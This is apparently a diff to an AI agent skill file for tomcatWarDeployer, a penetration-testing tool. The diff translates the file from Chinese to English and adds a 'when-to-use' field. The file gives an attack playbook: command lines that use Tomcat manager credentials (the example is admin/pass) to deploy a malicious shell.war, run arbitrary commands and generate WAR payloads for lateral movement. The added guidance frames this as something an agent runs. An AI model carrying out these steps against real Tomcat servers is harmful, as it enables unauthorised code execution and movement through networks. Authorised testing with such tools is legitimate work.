@@ -2,37 +2,41 @@
 name: tomcatwardeployer
 description: "tomcatWarDeployer exploits Tomcat admin consoles. Signals: lateral movement, psexec, Tomcat deployment, WAR generation"
 zh-signals: "tomcatWarDeployer: Tomcat 管理后台利用。信号:横向移动,psexec,Tomcat 部署,生成 WAR。"
+when-to-use: >-
+  Use when you have Tomcat manager credentials and want to deploy a malicious
+  WAR for code execution, or generate a WAR payload. Useful during lateral
+  movement against exposed Tomcat consoles.
 ---
 
 # tomcatWarDeployer
 
-- 攻击大类:C31 远程服务横向移动
-- 上游仓库:https://github.com/mgeeky/tomcatWarDeployer
-- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C31 Remote Service Lateral Movement
+- Upstream Repository: https://github.com/mgeeky/tomcatWarDeployer
+- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/mgeeky/tomcatWarDeployer && cd tomcatWarDeployer
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `python3 tomcatWarDeployer.py -H 10.0.0.5 -p 8080 -U admin -P pass -W shell.war` | Tomcat 部署 |
-| `-H host -p port -c 'cmd'` | 命令 |
-| `-g` | 生成 WAR |
+| `python3 tomcatWarDeployer.py -H 10.0.0.5 -p 8080 -U admin -P pass -W shell.war` | Tomcat deployment |
+| `-H host -p port -c 'cmd'` | Command |
+| `-g` | Generate WAR |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Tomcat 管理后台利用
+### Tomcat admin console exploitation
 
 ```bash
 python3 tomcatWarDeployer.py -H 10.0.0.5 -U admin -P pass -g
-# 弱口令+WAR 部署
+# Weak credentials + WAR deployment
 ```
 
-## 注意事项
+## Notes
 
-mgeeky 出品,Tomcat 部署自动化。
+From mgeeky; automates Tomcat deployment.
